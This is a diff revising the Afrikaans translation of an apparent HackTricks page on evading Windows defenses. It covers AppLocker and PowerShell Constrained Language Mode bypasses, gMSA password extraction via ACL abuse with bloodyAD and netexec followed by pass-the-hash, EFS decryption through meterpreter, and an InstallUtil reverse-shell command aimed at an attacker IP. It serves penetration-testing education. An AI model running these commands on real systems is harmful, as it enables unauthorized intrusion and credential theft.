@@ -2,16 +2,16 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## AppLocker Beleid
+## AppLocker-beleid
 
-'n Aansoek-witlys is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat toegelaat word om op 'n stelsel teenwoordig te wees en uitgevoer te word. Die doel is om die omgewing te beskerm teen skadelike malware en nie-goedgekeurde sagteware wat nie in lyn is met die spesifieke sakebehoeftes van 'n organisasie nie.
+'n Toepassings-witlys is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat op 'n stelsel teenwoordig mag wees en uitgevoer kan word. Die doel is om die omgewing te beskerm teen skadelike malware en ongeakkrediteerde sagteware wat nie by die spesifieke sakebehoeftes van 'n organisasie pas nie.
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **aansoek-witlys-oplossing** en gee stelselsadministrateurs beheer oor **watter toepassings en lêers gebruikers kan uitvoer**. Dit bied **gedetailleerde beheer** oor executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\
-Dit is algemeen dat organisasies **block cmd.exe and PowerShell.exe** en skryftoegang tot sekere gidse beperk, **maar dit alles kan omseil word**.
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's **oplossing vir toepassings-witlyste** en gee stelseladministrateurs beheer oor **watter toepassings en lêers gebruikers kan uitvoer**. Dit bied **fyn beheer** oor uitvoerbare lêers, skripte, Windows installer-lêers, DLLs, packaged apps, en packed app installers.  
+Dit is algemeen dat organisasies **blokkeer cmd.exe en PowerShell.exe** en skryftoegang tot sekere gidse beperk, **maar dit kan alles omseil word**.
 
-### Check
+### Kontroleer
 
-Kontroleer watter lêers/uitbreidings swartlys/witlys is:
+Kontroleer watter lêers/uitbreidings op die swartlys/witlys is:
 ```bash
 Get-ApplockerPolicy -Effective -xml
 
@@ -20,43 +20,43 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
-Hierdie registerpad bevat die konfigurasies en beleide wat deur AppLocker toegepas word, en bied 'n manier om die huidige stel reëls wat op die stelsel afgedwing word, te hersien:
+Hierdie registerpad bevat die konfigurasies en beleide wat deur AppLocker toegepas word en bied 'n manier om die huidige stel reëls wat op die stelsel afgedwing word, na te gaan:
 
 - `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
 
 ### Bypass
 
-- Useful **skryfbare vouers** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **skryfbare vouers** you can use to **bypass this**.
+- Nuttige **Writable folders** om AppLocker Policy te bypass: As AppLocker toelaat dat enigiets binne `C:\Windows\System32` of `C:\Windows` uitgevoer kan word, is daar **writable folders** wat jy kan gebruik om **bypass this**.
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
-- Dikwels **vertroude** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries kan ook nuttig wees om AppLocker te omseil.
-- **Sleg geskryfde reëls kan ook omseil word**
-- Byvoorbeeld, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, jy kan 'n **gids met die naam `allowed`** enige plek skep en dit sal toegelaat word.
-- Organisasies fokus ook dikwels op die **blokkeer van die `%System32%\WindowsPowerShell\v1.0\powershell.exe` uitvoerbare**, maar vergeet van die **ander** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
-- **DLL enforcement word baie selde geaktiveer** weens die bykomende las wat dit op 'n stelsel kan plaas, en die hoeveelheid toetsing wat nodig is om te verseker dat niks sal breek nie. Dus sal die gebruik van **DLLs as backdoors** help om AppLocker te omseil.
-- Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **execute Powershell** kode in enige proses uit te voer en AppLocker te omseil. Vir meer inligting, kyk: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).
+- Algemeen vertroude [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries kan ook nuttig wees om AppLocker te omseil.
+- **Sleg opgestelde reëls kan ook omseil word**
+- Byvoorbeeld, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, jy kan 'n **gids genaamd `allowed`** enige plek skep en dit sal toegelaat word.
+- Organisasies fokus dikwels op die blokkeer van die **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, maar vergeet van die **ander** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
+- **DLL enforcement word baie selde geaktiveer** as gevolg van die ekstra las wat dit op 'n stelsel kan plaas, en die hoeveelheid toetsing wat nodig is om te verseker dat niks sal breek nie. Daarom sal die gebruik van **DLLs as backdoors** help om AppLocker te omseil.
+- Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om PowerShell-code in enige proses uit te voer en AppLocker te omseil. Vir meer inligting, sien: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
-## Kredensiële berging
+## Credentials Storage
 
 ### Security Accounts Manager (SAM)
 
-Plaaslike kredensiële is in hierdie lêer teenwoordig; die wagwoorde is gehash.
+Lokale kredensiale is in hierdie lêer teenwoordig, die wagwoorde is gehash.
 
 ### Local Security Authority (LSA) - LSASS
 
-Die **kredensiële** (gehash) word **gestoor** in die **geheue** van hierdie subsisteem vir Single Sign-On redes.\
-**LSA** administreer die plaaslike **sekuriteitsbeleid** (wagwoordbeleid, gebruikerstoestemmings...), **authentication**, **access tokens**...\
-LSA sal die een wees wat die verskafde kredensiële binne die **SAM**-lêer sal **kontroleer** (vir 'n plaaslike aanmelding) en met die **domain controller** sal **praat** om 'n domeingebruiker te verifieer.
+Die **kredensiale** (gehash) word **gestoor** in die **geheue** van hierdie substelsel vir Single Sign-On redes.\
+**LSA** administreer die plaaslike **sekuriteitsbeleid** (wagwoordbeleid, gebruikerstoestemmings...), **verifikasie**, **toegangstokens**...\
+LSA sal die een wees wat die verskafde kredensiale binne die **SAM**-lêer (vir 'n plaaslike aanmelding) sal **kontroleer** en met die **domain controller** sal **kommunikeer** om 'n domeingebruiker te verifieer.
 
-Die **kredensiële** word **gestoor** binne die **proses LSASS**: Kerberos-kaartjies, NT- en LM-hashe, wagwoorde wat maklik gedekripteer kan word.
+Die **kredensiale** word **gestoor** binne die **proses LSASS**: Kerberos tickets, NT- en LM-hashes, maklik ontsleutelde wagwoorde.
 
 ### LSA secrets
 
-LSA kan sekere kredensiële op skyf stoor:
+LSA kan sommige kredensiale op skyf stoor:
 
 - Wagwoord van die rekenaarrekening van die Active Directory (onbereikbare domain controller).
 - Wagwoorde van die rekeninge van Windows-dienste
@@ -65,13 +65,13 @@ LSA kan sekere kredensiële op skyf stoor:
 
 ### NTDS.dit
 
-Dit is die databasis van die Active Directory. Dit is slegs op Domain Controllers teenwoordig.
+Dit is die databasis van die Active Directory. Dit is slegs teenwoordig op Domain Controllers.
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is 'n Antivirus wat beskikbaar is in Windows 10 en Windows 11, en in weergawes van Windows Server. Dit **blokkeer** algemene pentesting-instrumente soos **`WinPEAS`**. Daar is egter maniere om hierdie beskermings te **omseil**.
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is 'n antivirus wat beskikbaar is in Windows 10 en Windows 11, en in weergawes van Windows Server. Dit **blokkeer** algemene pentesting-instrumente soos **`WinPEAS`**. Daar is egter maniere om hierdie beskermings te omseil.
 
-### Kontroleer
+### Check
 
 Om die **status** van **Defender** te kontroleer kan jy die PS-cmdlet **`Get-MpComputerStatus`** uitvoer (kyk na die waarde van **`RealTimeProtectionEnabled`** om te weet of dit aktief is):
 
@@ -103,57 +103,57 @@ sc query windefend
 ```
 ## Gekodeerde Lêerstelsel (EFS)
 
-EFS beveilig lêers deur enkripsie en gebruik 'n **simmetriese sleutel** bekend as die **File Encryption Key (FEK)**. Hierdie sleutel word met die gebruiker se **openbare sleutel** gekodeer en in die gekodeerde lêer se $EFS **alternatiewe datastraam** gestoor. Wanneer ontsleuteling nodig is, word die ooreenstemmende **privaat sleutel** van die gebruiker se digitale sertifikaat gebruik om die FEK vanaf die $EFS-stroom te ontsleutel. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
+EFS beveilig lêers deur enkripsie en gebruik 'n **simbetriese sleutel** wat bekend staan as die **File Encryption Key (FEK)**. Hierdie sleutel word met die gebruiker se **public key** opgesluit en in die $EFS **alternatiewe datastroom** van die gekodeerde lêer gestoor. Wanneer ontsleuteling nodig is, word die ooreenstemmende **private key** van die gebruiker se digitale sertifikaat gebruik om die FEK vanuit die $EFS-stroom te ontsluit. Meer besonderhede is beskikbaar [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
 
-**Ontsleuteling-scenario's sonder gebruikersinisiëring** sluit in:
+**Ontsleutelingsscenario's sonder gebruikersinitiasie** sluit in:
 
-- Wanneer lêers of vouers na 'n nie-EFS lêerstelsel verskuif word, soos [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), word hulle outomaties ontsleuteld.
-- Gekodeerde lêers wat oor die netwerk via die SMB/CIFS-protokol gestuur word, word voor transmissie ontsleuteld.
+- Wanneer lêers of vouers na 'n nie-EFS lêerstelsel geskuif word, soos [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), word hulle outomaties ontsluit.
+- Gekodeerde lêers wat oor die netwerk via SMB/CIFS gestuur word, word voor transmissie ontsluit.
 
-Hierdie enkripsiemetode laat die eienaar toe om op 'n **deursigtige wyse** toegang tot die gekodeerde lêers te hê. Net die eienaar se wagwoord verander en aanmeld sal egter nie ontsleuteling moontlik maak nie.
+Hierdie enkripsiemetode laat toe vir **deursigtige toegang** tot gekodeerde lêers vir die eienaar. Tog sal dit nie volstaan om bloot die eienaar se wagwoord te verander en aan te teken om ontsleuteling moontlik te maak nie.
 
 Belangrike punte:
 
-- EFS gebruik 'n simmetriese FEK, wat met die gebruiker se openbare sleutel gekodeer is.
-- Ontsleuteling gebruik die gebruiker se privaat sleutel om by die FEK uit te kom.
-- Outomatiese ontsleuteling vind plaas onder spesifieke toestande, soos kopieer na FAT32 of netwerktransmissie.
-- Gekodeerde lêers is vir die eienaar toeganklik sonder ekstra stappe.
+- EFS gebruik 'n simmetriese FEK, wat met die gebruiker se public key geënkripteer word.
+- Ontsleuteling gebruik die gebruiker se private key om by die FEK uit te kom.
+- Outomatiese ontsleuteling gebeur onder spesifieke toestande, soos kopieer na FAT32 of netwerktransmissie.
+- Gekodeerde lêers is vir die eienaar toeganklik sonder addisionele stappe.
 
 ### Kontroleer EFS-inligting
 
-Kyk of 'n **gebruiker** hierdie **diens** gebruik het deur te kyk of hierdie pad bestaan:`C:\users\<username>\appdata\roaming\Microsoft\Protect`
+Kontroleer of 'n **gebruiker** hierdie **diens** gebruik het deur te kyk of hierdie pad bestaan: `C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
-Kontroleer **wie** toegang tot die lêer het met die gebruik van cipher /c \<file\>  
-Jy kan ook gebruik maak van `cipher /e` en `cipher /d` binne 'n gids om alle lêers te **enkripteer** en **ontsleutel**.
+Kontroleer **wie** toegang tot die lêer het met `cipher /c \<file\>`  
+Jy kan ook `cipher /e` en `cipher /d` binne 'n vouer gebruik om al die lêers te **enkripteer** en **ontsleutel**.
 
 ### Ontsleuteling van EFS-lêers
 
-#### Wees SYSTEM
+#### SYSTEM-bevoegdheid
 
-Hierdie metode vereis dat die **slagoffer-gebruiker** 'n **proses** op die gasheer laat loop. As dit die geval is, kan jy met 'n `meterpreter` sessie die token van die gebruiker se proses simuleer (`impersonate_token` van `incognito`). Of jy kan net na die gebruiker se proses `migrate`.
+Hierdie metode vereis dat die **slagoffergebruik­er** 'n **proses** op die gasheer laat loop. As dit die geval is, kan jy met 'n `meterpreter`-sessie die token van die proses van die gebruiker imiteer (`impersonate_token` van `incognito`). Of jy kan net na die proses van die gebruiker `migrate`.
 
-#### Weet die gebruiker se wagwoord
+#### Om die gebruiker se wagwoord te ken
 
 
 {{#ref}}
 https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
 {{#endref}}
 
-## Gegroepeerde Beheerde Diensrekeninge (gMSA)
+## Groep Beheerde Service-rekeninge (gMSA)
 
-Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van diensrekeninge in IT-infrastrukture te vereenvoudig. Anders as tradisionele diensrekeninge wat dikwels die "Password never expire" instelling aangeskakel het, bied gMSA's 'n veiliger en beter hanteerbare oplossing:
+Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van service-rekeninge in IT-infrastrukture te vereenvoudig. Anders as tradisionele service-rekeninge wat dikwels die instelling "**Password never expire**" opgesit het, bied gMSAs 'n veiliger en meer bestuurbare oplossing:
 
-- **Outomatiese Wagwoordbestuur**: gMSA's gebruik 'n komplekse, 240-karakter wagwoord wat outomaties verander volgens domein- of rekenaarbeleid. Hierdie proses word deur Microsoft's Key Distribution Service (KDC) hanteer, wat die behoefte aan handmatige wagwoordopdaterings uitskakel.
-- **Verbeterde Sekuriteit**: Hierdie rekeninge is immuun teen kontosluitings en kan nie vir interaktiewe aanmeldings gebruik word nie, wat hul sekuriteit verhoog.
-- **Ondersteuning vir Meerdere Host**: gMSA's kan oor meerdere hosts gedeel word, wat hulle ideaal maak vir dienste wat op meerdere bedieners loop.
-- **Geskeduleerde Taakvermoë**: Anders as managed service accounts, ondersteun gMSA's die uitvoering van geskeduleerde take.
+- **Outomatiese wagwoordbestuur**: gMSAs gebruik 'n komplekse, 240-karakter wagwoord wat outomaties verander volgens domein- of rekenaarbeleid. Hierdie proses word deur Microsoft se Key Distribution Service (KDC) hanteer, wat die behoefte aan handmatige wagwoordopdaterings uitskakel.
+- **Verbeterde veiligheid**: Hierdie rekeninge is immuun vir lockouts en kan nie vir interaktiewe aanmeldings gebruik word nie, wat hul veiligheid verhoog.
+- **Meervoudige gasheerondersteuning**: gMSAs kan oor verskeie gasheer gedeel word, wat dit ideaal maak vir dienste wat op veelvuldige bedieners loop.
+- **Geskeduleerde Taak-ondersteuning**: Anders as managed service accounts, ondersteun gMSAs die uitvoering van geskeduleerde take.
 - **Vereenvoudigde SPN-bestuur**: Die stelsel werk die Service Principal Name (SPN) outomaties by wanneer daar veranderinge aan die rekenaar se sAMaccount-besonderhede of DNS-naam is, wat SPN-bestuur vereenvoudig.
 
-Die wagwoorde vir gMSA's word gestoor in die LDAP-eiendom _**msDS-ManagedPassword**_ en word outomaties elke 30 dae deur Domain Controllers (DCs) gereset. Hierdie wagwoord, 'n enkodeerde datablik bekend as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur gemagtigde administrateurs en die bedieners waarop die gMSA's geïnstalleer is, onttrek word, wat 'n veilige omgewing verseker. Om by hierdie inligting te kom, is 'n beveiligde verbinding soos LDAPS vereis, of die verbinding moet met 'Sealing & Secure' geverifieer wees.
+Die wagwoorde vir gMSAs word in die LDAP-eiendom _**msDS-ManagedPassword**_ gestoor en word outomaties elke 30 dae deur Domain Controllers (DCs) gereset. Hierdie wagwoord, 'n enkripteerde datablik bekend as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur gemagtigde administrateurs en die bedieners waarop die gMSAs geïnstalleer is, verkry word, wat 'n veilige omgewing verseker. Om by hierdie inligting uit te kom, is 'n gesekuriseerde verbinding soos LDAPS vereis, of die verbinding moet geverifieer wees met 'Sealing & Secure'.
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)
 
-Jy kan hierdie wagwoord uitlees met [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
+Jy kan hierdie wagwoord lees met [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
@@ -161,44 +161,44 @@ Jy kan hierdie wagwoord uitlees met [**GMSAPasswordReader**](https://github.com/
 
 Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.
 
-### Abusing ACL chaining to read gMSA managed password (GenericAll -> ReadGMSAPassword)
+### Misbruik van ACL-chaining om gMSA-beheerde wagwoord te lees (GenericAll -> ReadGMSAPassword)
 
-In baie omgewings kan laag‑privilegie gebruikers sonder om die DC te kompromitteer na gMSA‑geheime draai deur miskonfigureerde objek‑ACLs te misbruik:
+In baie omgewings kan laag-geprivilegieerde gebruikers na gMSA-geheime skuif sonder om die DC te kompromitteer deur misgekonfigureerde object ACLs te misbruik:
 
-- 'n groep wat jy kan beheer (bv. via GenericAll/GenericWrite) word toegestaan met `ReadGMSAPassword` oor 'n gMSA.
+- ’n groep wat jy kan beheer (bv. via GenericAll/GenericWrite) kry toegeken `ReadGMSAPassword` oor ’n gMSA.
 - Deur jouself by daardie groep te voeg, erf jy die reg om die gMSA se `msDS-ManagedPassword` blob oor LDAP te lees en bruikbare NTLM credentials af te lei.
 
-Tipiese werkvloeistroom:
+Tipiese werkvloei:
 
-1) Ontdek die pad met BloodHound en merk jou foothold‑principals as Owned. Soek na rande soos:
+1) Vind die pad met BloodHound en merk jou foothold-prinsipale as Owned. Soek vir kante soos:
 - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA
 
 2) Voeg jouself by die tussengroep wat jy beheer (voorbeeld met bloodyAD):
 ```bash
 bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
 ```
-3) Lees die gMSA-beheerde wagwoord via LDAP en lei die NTLM-hash af. NetExec outomatiseer die uittrekking van `msDS-ManagedPassword` en die omskakeling na NTLM:
+3) Lees die gMSA-beheerde wagwoord via LDAP en lei die NTLM-hash af. NetExec outomatiseer die onttrekking van `msDS-ManagedPassword` en die omskakeling na NTLM:
 ```bash
 # Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
 netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
 # Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
 ```
-4) Meld aan as die gMSA deur die NTLM-hash te gebruik (geen plaintext nodig nie). As die rekening in Remote Management Users is, sal WinRM direk werk:
+4) Verifieer as die gMSA deur die NTLM hash te gebruik (no plaintext needed). As die rekening in Remote Management Users is, sal WinRM direk werk:
 ```bash
 # SMB / WinRM as the gMSA using the NT hash
 netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
 netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
 ```
 Notes:
-- LDAP reads of `msDS-ManagedPassword` require sealing (e.g., LDAPS/sign+seal). Tools handle this automatically.
-- gMSAs word dikwels voorsien van plaaslike regte soos WinRM; verifieer groep-lidmaatskap (bv. Remote Management Users) om laterale beweging te beplan.
-- As jy net die blob nodig het om die NTLM self te bereken, sien MSDS-MANAGEDPASSWORD_BLOB-structuur.
+- LDAP-lesings van `msDS-ManagedPassword` vereis sealing (bv., LDAPS/sign+seal). Tools hanteer dit outomaties.
+- gMSAs kry dikwels plaaslike regte soos WinRM; valideer groepslidmaatskap (bv., Remote Management Users) om lateral movement te beplan.
+- As jy net die blob nodig het om self die NTLM te bereken, sien MSDS-MANAGEDPASSWORD_BLOB struktuur.
 
 
 
 ## LAPS
 
-Die **Local Administrator Password Solution (LAPS)**, beskikbaar vir aflaai by [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), stel die bestuur van plaaslike Administrator-wagwoorde in staat. Hierdie wagwoorde, wat **willekeurig gegenereer**, uniek en **gereeld verander** word, word sentraal in Active Directory gestoor. Toegang tot hierdie wagwoorde word deur ACLs beperk tot gemagtigde gebruikers. As voldoende toestemmings toegeken is, kan die vermoë om plaaslike admin-wagwoorde te lees verkry word.
+Die **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), maak die bestuur van plaaslike Administrator-wagwoorde moontlik. Hierdie wagwoorde, wat **willekeurig** gegenereer, uniek, en **gereeld verander** word, word sentraal in Active Directory gestoor. Toegang tot hierdie wagwoorde word deur ACLs tot geautoriseerde gebruikers beperk. Met voldoende bevoegdhede toegestaan, word die vermoë gebied om plaaslike admin-wagwoorde te lees.
 
 
 {{#ref}}
@@ -207,7 +207,7 @@ Die **Local Administrator Password Solution (LAPS)**, beskikbaar vir aflaai by [
 
 ## PS Constrained Language Mode
 
-PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **sluit baie van die funksies af** wat nodig is om PowerShell effektief te gebruik, soos die blokkering van COM-objekte, beperking tot goedgekeurde .NET-tipes, XAML-gebaseerde workflows, PowerShell-klasse, en meer.
+PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **beperk baie van die funksies** wat nodig is om PowerShell effektief te gebruik, soos die blokkering van COM-objekte, slegs goedgekeurde .NET-tipes toelaat, XAML-gebaseerde workflows, PowerShell-klasse, en meer.
 
 ### **Kontroleer**
 ```bash
@@ -219,8 +219,8 @@ $ExecutionContext.SessionState.LanguageMode
 #Easy bypass
 Powershell -version 2
 ```
-In huidige Windows sal daardie bypass nie werk nie, maar jy kan [ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**Om dit te compileer mag jy** **moet** _**Voeg 'n verwysing by**_ -> _Blaai_ -> _Blaai_ -> voeg `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` by en **verander die projek na .Net4.5**.
+In huidige Windows sal daardie Bypass nie werk nie, maar jy kan [ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) gebruik.\  
+**Om dit te kompileer mag jy** **om** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> voeg `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` by en **verander die projek na .Net4.5**.
 
 #### Direkte bypass:
 ```bash
@@ -230,11 +230,11 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-kode in enige proses uit te voer en die constrained mode te omseil. Vir meer inligting sien: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).
+Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **execute Powershell** code in enige proses uit te voer en die constrained mode te bypass. Vir meer info sien: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).
 
 ## PS Uitvoeringsbeleid
 
-Standaard is dit ingestel op **restricted.** Hoof maniere om hierdie beleid te omseil:
+Standaard is dit gestel op **restricted.** Hoof maniere om hierdie beleid te bypass:
 ```bash
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -254,32 +254,32 @@ Powershell -command "Write-Host 'My voice is my passport, verify me.'"
 9º Use EncodeCommand
 $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
 ```
-Meer inligting is beskikbaar [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
+Meer inligting is beskikbaar [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
 
 ## Security Support Provider Interface (SSPI)
 
-Is die API wat gebruik kan word om gebruikers te verifieer.
+Dit is die API wat gebruik kan word om gebruikers te verifieer.
 
-Die SSPI is verantwoordelik om die geskikte protokol te vind vir twee masjiene wat wil kommunikeer. Die voorkeurmetode hiervoor is Kerberos. Dan sal die SSPI onderhandel watter verifikasieprotokol gebruik sal word; hierdie verifikasieprotokolle word Security Support Provider (SSP) genoem, is geleë in elke Windows-masjien in die vorm van 'n DLL en beide masjiene moet dieselfde ondersteun om te kan kommunikeer.
+Die SSPI is verantwoordelik om die geskikte protokol te vind vir twee masjiene wat wil kommunikeer. Die voorkeurmetode hiervoor is Kerberos. Die SSPI sal dan onderhandel watter authentication protocol gebruik sal word; hierdie authentication protocols word Security Support Provider (SSP) genoem, is in elke Windows-masjien in die vorm van 'n DLL geleë, en beide masjiene moet dieselfde ondersteun om te kan kommunikeer.
 
-### Hoof SSPs
+### Main SSPs
 
-- **Kerberos**: Die voorkeur een
+- **Kerberos**: Die voorkeur
 - %windir%\Windows\System32\kerberos.dll
-- **NTLMv1** and **NTLMv2**: Kompatibiliteitsredes
+- **NTLMv1** and **NTLMv2**: vir versoenbaarheidsredes
 - %windir%\Windows\System32\msv1_0.dll
-- **Digest**: Webservers en LDAP, wagwoord in die vorm van 'n MD5-hash
+- **Digest**: Webservers en LDAP; wagwoord in die vorm van 'n MD5-hash
 - %windir%\Windows\System32\Wdigest.dll
-- **Schannel**: SSL and TLS
+- **Schannel**: SSL en TLS
 - %windir%\Windows\System32\Schannel.dll
-- **Negotiate**: Dit word gebruik om die protokol te onderhandel wat gebruik moet word (Kerberos of NTLM, met Kerberos as die verstek)
+- **Negotiate**: Word gebruik om die protokol te onderhandel wat gebruik gaan word (Kerberos of NTLM, met Kerberos as die verstek)
 - %windir%\Windows\System32\lsasrv.dll
 
-#### Die onderhandeling kan verskeie metodes of net een aanbied.
+#### Die onderhandeling kan verskeie metodes of slegs een aanbied.
 
 ## UAC - User Account Control
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n funksie wat 'n **toestemmingprompt vir verhoogde aktiwiteite** moontlik maak.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n funksie wat 'n **toestemmingsprompt vir aktiwiteite met verhoogde regte** moontlik maak.
 
 
 {{#ref}}
